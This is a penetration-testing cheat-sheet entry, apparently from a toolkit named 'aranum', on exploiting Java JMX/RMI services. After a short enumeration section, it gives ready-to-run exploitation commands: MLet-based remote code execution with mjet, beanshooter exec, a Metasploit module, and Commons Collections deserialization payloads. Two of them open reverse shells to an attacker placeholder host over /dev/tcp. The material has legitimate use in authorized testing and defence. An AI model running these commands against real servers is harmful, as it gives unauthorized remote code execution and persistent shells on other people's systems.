---
service: jmx
title: Java Management Extensions (JMX / RMI)
ports: 1099, 1100, 9010, 9999, 7199
aliases: rmi, java-rmi, jmx-rmi
---

# JMX / RMI — quick wins

**When you see it:** an RMI registry on 1099 (or a custom JMX port) and the service
returns an RMI stub — if `com.sun.management.jmxremote.authenticate=false`, unauthenticated
access to MBeans gives direct OS command execution via MLet or deserialization.

> Authorized testing only. Triage is read-only; steps marked ✏️ execute OS commands on
> the target.

## Triage (read-only)
```sh
# Version + RMI registry probe
nmap -sV --script "rmi-dumpregistry,rmi-vuln-classloader" -p 1099,9010,9999 H -Pn

# Enumerate with beanshooter (preferred modern tool):
beanshooter enum H PORT
beanshooter list H PORT          # list registered MBeans
beanshooter info H PORT          # service metadata

# Remote Method Guesser — broader port scan + registry dump:
rmg enum H PORT
```

## Quick wins

### Unauthenticated RCE via MLet ✏️
```sh
# 1. Start HTTP server on ATT (serves the MLet HTML and malicious JAR):
jython mjet.py H PORT install dummy_pass http://ATT:8000 8000
# 2. Execute commands:
jython mjet.py H PORT command dummy_pass "id"
jython mjet.py H PORT shell       # interactive shell
```
*Why:* if authentication is disabled, the MLet MBean can be invoked to load an arbitrary
JAR from an attacker-controlled HTTP server; this is equivalent to unauthenticated RCE.
`mjet` (Mogwai Labs) automates the full attack chain — HTTP server, MLet file, JAR
staging, and command execution.

*Tool:* `git clone https://github.com/mogwailabs/mjet` (requires Jython).

### Unauthenticated RCE via beanshooter ✏️
```sh
beanshooter standard H PORT exec 'id'
# Or deploy a tonka bean for persistent access:
beanshooter tonka H PORT exec 'bash -i >& /dev/tcp/ATT/4444 0>&1'
```
*Why:* `beanshooter` is the modern replacement for mjet/sjet — native Python, no Jython
needed. `standard exec` uses the built-in `Runtime.exec` MBean if auth is off.

*Tool:* `pip install beanshooter` or `git clone https://github.com/qtc-de/beanshooter`.

### Metasploit — insecure JMX config ✏️
```sh
msfconsole -q
use exploit/multi/misc/java_jmx_server
set RHOSTS H
set RPORT PORT       # default 1099
set LHOST ATT
run
```
*Why:* the Metasploit module automates MLet-based code execution against JMX servers
with `authenticate=false`; simpler than mjet for quick shells.

### Authenticated deserialization RCE (when creds known) ✏️
```sh
# With Commons Collections or other gadget chains on the classpath:
beanshooter serial H PORT CommonsCollections6 "bash -c 'bash -i >& /dev/tcp/ATT/4444 0>&1'"
# mjet variant:
jython mjet.py --jmxrole USER --jmxpassword PASS H PORT deserialize CommonsCollections6 "id"
```
*Why:* even with authentication enabled, if the classpath contains a vulnerable gadget
chain (CommonsCollections, Spring, etc.) you can deserialize a payload over the JMX
transport without needing MLet.

## aranum helpers
- `aranumtoolkit/network/enum-jmx.sh` — produced this finding; runs nmap RMI scripts and
  basic beanshooter enum.

## Gotchas
- JMX ports are dynamic: the RMI registry is on 1099, but the actual JMX service binds to
  a random ephemeral port advertised in the registry stub — nmap must scan the full port
  range or use `rmg scan` to find both.
- Firewall rules often allow 1099 but block the random data port — the exploit will hang
  after registry lookup. Use SSH tunnels or check if a fixed port was configured
  (`com.sun.management.jmxremote.port`).
- MLet attacks require the target JMX server to make an *outbound* HTTP connection to ATT
  — blocked on air-gapped or egress-filtered networks; fall back to deserialization.
- Java 9+ restricts some RMI classloader behavior (`useCodebaseOnly=true` by default);
  MLet is not affected but raw RMI classloading gadgets may fail.
- `beanshooter` and `mjet` assume the RMI stub is reachable; if `rmg enum` returns a
  stub with a private IP, port-forward first.

## Sources
- HackTricks `1098/1099/1050-pentesting-java-rmi`; Mogwai Labs "Attacking RMI based JMX
  services"; PayloadsAllTheThings Java RMI; Rapid7 `java_jmx_server` module docs;
  Code White "JMX Exploitation Revisited" (2023).
